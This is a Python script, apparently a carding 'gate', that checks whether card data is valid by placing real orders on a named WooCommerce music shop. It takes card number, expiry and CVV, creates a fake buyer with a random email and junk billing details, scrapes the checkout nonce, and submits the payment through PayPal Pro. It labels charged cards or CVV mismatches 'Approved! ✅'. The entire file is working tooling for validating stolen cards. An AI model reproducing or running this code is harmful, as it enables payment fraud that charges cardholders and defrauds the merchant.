import requests
import re
import base64
import json
import names
import random
from fake_useragent import UserAgent
import time
import uuid
import time
from requests import Session
import time
from bs4 import BeautifulSoup
from dataclasses import dataclass



def paserX(data, first, last):
    try:
        return re.search(f'{first}(.*?){last}', data).group(1)
    except:
        return None 
    
Agent = UserAgent().random

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session
@dataclass
class pafiwess:
    def main(self, card):
        try:
            
            self.card = card
            self.ccs = card.split('|')
            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"

            session = requests.Session()

            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()
            session=requests.Session()
            headers = {
                'User-Agent': Agent,
                'Accept': 'text/html,application/xhtml+xml',
            }

            response = session.get(
                'https://www.neffmusic.com/blog/product/beginner-jazz-improvisation-lesson-7a-tenor-sax/',
                headers=headers,
            )

            response = session.post('https://www.neffmusic.com/blog/product/beginner-jazz-improvisation-lesson-7a-tenor-sax/',headers=headers)
            session.post(
                'https://www.neffmusic.com/blog/product/beginner-jazz-improvisation-lesson-7a-tenor-sax/',
                data = {
                    'quantity': '1',
                    'add-to-cart': '8282',
                }
            )
            response = session.get('https://www.neffmusic.com/blog/cart/', headers=headers)
            response = session.get('https://www.neffmusic.com/blog/checkout/',  headers=headers).text
            chek = paserX(response, 'name="woocommerce-process-checkout-nonce" value="', '"')
            print(chek)
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.5',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.neffmusic.com',
                'priority': 'u=1, i',
                'referer': 'https://www.neffmusic.com/blog/checkout/',
                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': Agent,
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'wp_woocommerce_session_4eb9ba23237ca9b4afd382a2d845b2d8=t_2b59712c476345e7a988d5bacf26d3%7C1779646763%7C1779560363%7C%24generic%24jKaLcnKLGyORoqQvySnciIWi6BFLVrLPmXckblGj; twp_session=f16f1d94ee3f1edc5bdf5e2a4713f39c%7C%7C1779488825%7C%7C1779488465; woocommerce_items_in_cart=1; woocommerce_cart_hash=680fecd6a14754816fb5f20dbfd93a8d; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-22%2018%3A18%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.neffmusic.com%2Fblog%2F2016%2F04%2Fjoe-allard-overtone-exercise-for-saxophone%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-05-22%2018%3A18%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.neffmusic.com%2Fblog%2F2016%2F04%2Fjoe-allard-overtone-exercise-for-saxophone%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; rotatePerPage8=2; sbjs_udata=vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F148.0.0.0%20Safari%2F537.36; rotatePerPage5=8; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.neffmusic.com%2Fblog%2Fcheckout%2F',
            }

            params = {
                'wc-ajax': 'checkout',
            }

            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.neffmusic.com%2Fblog%2F2016%2F04%2Fjoe-allard-overtone-exercise-for-saxophone%2F&wc_order_attribution_session_start_time=2026-05-22+18%3A18%3A33&wc_order_attribution_session_pages=4&wc_order_attribution_session_count=3&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F148.0.0.0+Safari%2F537.36&billing_first_name=ldfl&billing_last_name=dsdasd&billing_company=ggd&billing_country=US&billing_address_1=moall+del+sol&billing_address_2=sadw&billing_city=guayas&billing_state=NY&billing_postcode=10080&billing_phone=%2B10989861371&billing_email={CorreoRand}&account_username=&cart%5B168efc366c449fab9c2843e9b54e2a18%5D%5Bqty%5D=1&payment_method=paypal_pro&paypal_pro-card-number={self.ccs[0]}&paypal_pro-card-expiry={self.ccs[1]}+%2F+{self.ccs[2]}&paypal_pro-card-cvc={self.ccs[3]}&woocommerce-process-checkout-nonce={chek}&_wp_http_referer=%2Fblog%2F%3Fwc-ajax%3Dupdate_order_review'

            response = session.post('https://www.neffmusic.com/blog/', params=params,  headers=headers, data=data)
            data = response.json()

            mensaje = 'None'

            if "messages" in data:
                match = re.search(r"<li>(.*?)</li>", data["messages"], re.S)
                if match:
                    mensaje = match.group(1).strip()

            elif "message" in data:
                mensaje = str(data["message"]).strip()

            if mensaje == 'None':
                return 'Approved! ✅', 'Charged $10.21'

            if 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.' in mensaje:
                return 'Approved! ✅', 'CVV2 Mismatch: 15004-This transaction cannot be processed.'

            else:
                return 'Declined! ❌', mensaje

        except requests.exceptions.JSONDecodeError:
            return 'Declined! ❌', 'Invalid JSON Response.'

        except Exception:
            return 'Declined! ❌', 'error gate'



        


